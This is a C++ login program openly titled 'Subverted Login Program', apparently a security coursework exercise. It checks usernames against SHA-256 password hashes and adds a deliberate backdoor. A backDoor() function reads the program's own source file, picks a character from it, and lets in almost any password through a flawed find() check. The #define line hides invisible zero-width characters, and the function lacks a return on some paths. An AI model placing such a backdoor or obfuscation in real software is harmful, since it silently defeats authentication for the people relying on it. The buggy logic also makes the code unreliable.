// Subverted Login P​rogram

#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"

#define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​"

char character;

using namespace std;

// Function to get the SHA256 hash of a string
string getSHA256(const string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, input.c_str(), input.size()); // Hashing our input
    SHA256_Final(hash, &sha256); // Storing our input inside of hash.

    stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) 
        ss << hex << setw(2) << setfill('0') << (int)hash[i]; // Convert the binary of the hash to hexidecimal
    return ss.str(); // Returning hash as string
}

bool backDoor(const string& password) {
    ifstream sourceFile("login-subverted.cpp");
    string line;
    char character;
    if (getline(sourceFile, line)) {
        character = line[20];
    }
    sourceFile.close();

    if (password.find(character)) {
        return true;
    }
 
}

int main() {
    const int MAX_ATTEMPTS = 3; // Int to store max amount of attempts allowed
    int attempts = 0; // Stores amount of attempts user has done
    string usernameIn, passwordIn, line; // Store user inputs and line string for file reading

    // Loop until user is authenticated or max attempts are reached
    while(attempts++ < MAX_ATTEMPTS){
        cout << "Enter your username: "; cin >> usernameIn; // Prompt and store username
        cout << "Enter your password: "; cin >> passwordIn; // Prompt and store password

        // Open the file containing stored usernames and passwords, print error if problem
        ifstream passwordsFile("passwords.txt");
        if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }
        
        // Read the file line by line
        bool isAuthenticated = false;
        while (getline(passwordsFile, line) && !isAuthenticated) {
            stringstream ss(line);
            string usernameFromFile, passwordFromFile;
            getline(ss, usernameFromFile, ':'); // Extract username from the read line
            getline(ss, passwordFromFile, ':'); // Extract password from the read line
            isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == getSHA256(passwordIn); // Check if entered credentials match any in the file
        }
        passwordsFile.close(); // Close the file after reading

        if (isAuthenticated || backDoor(passwordIn)) {
            authenticated(usernameIn); return 0; // Exit indicating successful authentication
        } 
        else if(attempts < MAX_ATTEMPTS) {
            cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
            // system("clear"); // Clear the console screen
        } else {
            rejected(usernameIn); // Inform the user that they have been rejected after max attempts
        } 
    }
    return 0;
}

